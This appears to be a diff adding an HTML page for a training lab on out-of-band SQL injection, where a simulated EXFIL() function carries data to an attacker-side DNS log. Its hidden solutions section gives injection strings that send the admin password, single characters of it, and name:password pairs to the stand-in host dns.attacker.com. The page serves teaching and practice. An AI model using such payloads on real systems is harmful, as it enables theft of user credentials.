@@ -1,0 +1,120 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>SQLi Lab 09 — Out-of-Band Exfiltration</title>
+    <script>
+      (function () {
+        var t = new URLSearchParams(location.search).get("theme");
+        if (t) document.documentElement.dataset.theme = t;
+      })();
+    </script>
+    <link rel="stylesheet" href="../../../css/theme.css" />
+    <link rel="stylesheet" href="../../../css/components.css" />
+    <link rel="stylesheet" href="../../../css/labs.css" />
+  </head>
+  <body>
+    <div class="lab-page">
+      <div class="lab-brand">
+        <strong>SQL INJECTION / LAB 09</strong
+        ><span>Out-of-Band Exfiltration</span>
+      </div>
+      <div class="lab-container">
+        <h1>Out-of-Band Exfiltration</h1>
+        <p class="lead">
+          No data in the response. No true/false difference. No timing signal
+          you can reliably measure. And yet the attacker still gets the password
+          — because the database makes an outbound network call that carries the
+          secret with it. This lab simulates that channel with an
+          <code>EXFIL()</code> function writing to an attacker-side log.
+        </p>
+
+        <div class="lab-card">
+          <div class="eyebrow">EMAIL CHECK</div>
+          <p class="muted">Returns only "registered" or "not registered".</p>
+          <label>Email</label>
+          <input
+            id="email"
+            class="lab-input"
+            value="alice@corp.com"
+            autocomplete="off"
+          />
+          <button id="check" class="lab-btn">CHECK</button>
+          <div id="output"></div>
+        </div>
+
+        <div class="lab-card">
+          <div class="eyebrow">ATTACKER DNS LOG</div>
+          <p class="muted">
+            Simulated view of the attacker's own server. Any
+            <code>EXFIL('host', value)</code> call lands here.
+          </p>
+          <pre
+            id="log"
+            class="query-box"
+            style="max-height: 220px; overflow: auto; white-space: pre-wrap"
+          ></pre>
+        </div>
+
+        <div class="lab-card">
+          <div class="eyebrow">CHALLENGES</div>
+          <div class="challenge">
+            <strong>01 — Leak the admin password</strong
+            ><small
+              >Use <code>EXFIL</code> to send the password out through the DNS
+              log.</small
+            >
+          </div>
+          <div class="challenge">
+            <strong>02 — Leak one character at a time</strong
+            ><small
+              >Pretend <code>substr()</code> is available and exfiltrate the
+              password character by character.</small
+            >
+          </div>
+          <div class="challenge">
+            <strong>03 — Leak the whole users table</strong
+            ><small
+              >Concatenate several columns into a single exfil call.</small
+            >
+          </div>
+          <details class="lab-solutions">
+            <summary>View solutions</summary>
+
+            <div class="solution">
+              <strong>01 — Full password</strong>
+              <small>Any expression can be passed to EXFIL.</small>
+              <pre><code>Email: x' AND EXFIL('dns.attacker.com', (SELECT password FROM users WHERE name='admin')) --</code></pre>
+            </div>
+
+            <div class="solution">
+              <strong>02 — Character at a time</strong>
+              <small
+                >Use SUBSTR() to leak in chunks. The engine supports
+                <code>substr(x, i, n)</code>.</small
+              >
+              <pre><code>Email: x' AND EXFIL('dns.attacker.com', substr((SELECT password FROM users WHERE name='admin'),1,1)) --</code></pre>
+              <p class="muted" style="margin: 8px 0 0">
+                Change the start index to walk the string. Each character lands
+                in the log.
+              </p>
+            </div>
+
+            <div class="solution">
+              <strong>03 — Whole users table</strong>
+              <small
+                >Concatenate with <code>||</code> (or
+                <code>concat()</code>).</small
+              >
+              <pre><code>Email: x' AND EXFIL('dns.attacker.com', (SELECT name || ':' || password FROM users LIMIT 1)) --</code></pre>
+            </div>
+          </details>
+          <button id="reset" class="lab-btn secondary">RESET</button>
+        </div>
+
+        <script src="script.js"></script>
+      </div>
+    </div>
+  </body>
+</html>
